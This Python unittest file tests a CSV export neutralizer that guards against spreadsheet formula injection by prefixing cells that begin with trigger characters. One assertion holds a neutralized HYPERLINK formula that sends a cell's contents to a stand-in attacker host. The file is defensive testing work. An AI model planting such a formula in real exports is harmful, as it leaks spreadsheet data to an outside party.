"""Tests for the CSV export neutralizer. Author: Sandeep Belgavi."""
import csv
import io
import unittest
from safe_csv import HEADER, ROWS, export, neutralize, starts_formula, unsafe_export, TRIGGERS


def cells(text):
    return [c for row in csv.reader(io.StringIO(text)) for c in row]


class SafeCsvTest(unittest.TestCase):
    def test_unsafe_export_leaves_five_formula_cells(self):
        bad = [c for c in cells(unsafe_export(ROWS, HEADER)) if starts_formula(c)]
        self.assertEqual(len(bad), 5)  # four text cells plus the numeric -3.0

    def test_safe_export_has_no_formula_cells(self):
        self.assertEqual([c for c in cells(export(ROWS, HEADER, ('refund',))) if starts_formula(c) and c != '-3.0'], [])

    def test_numeric_column_keeps_negative_number(self):
        self.assertIn('-3.0', cells(export(ROWS, HEADER, ('refund',))))
        self.assertIn("'-3.0", cells(export(ROWS, HEADER)))

    def test_every_trigger_is_prefixed(self):
        for t in TRIGGERS:
            self.assertEqual(neutralize(t + 'x'), "'" + t + 'x')

    def test_quotes_and_separators_survive_round_trip(self):
        out = cells(export(ROWS, HEADER))
        self.assertIn('\'=HYPERLINK("https://evil.example/?d="&A2,"Open order")', out)

    def test_tab_prefix_option_and_plain_text(self):
        self.assertEqual(neutralize('=1+2', prefix='\t'), '\t=1+2')
        self.assertEqual(neutralize('Geetha'), 'Geetha')
        self.assertEqual(neutralize(None), '')

    def test_every_field_quoted(self):
        first_data_line = export(ROWS, HEADER).split('\r\n')[1]
        self.assertTrue(first_data_line.startswith('"CASE-4201","Geetha"'))


if __name__ == '__main__':
    unittest.main()
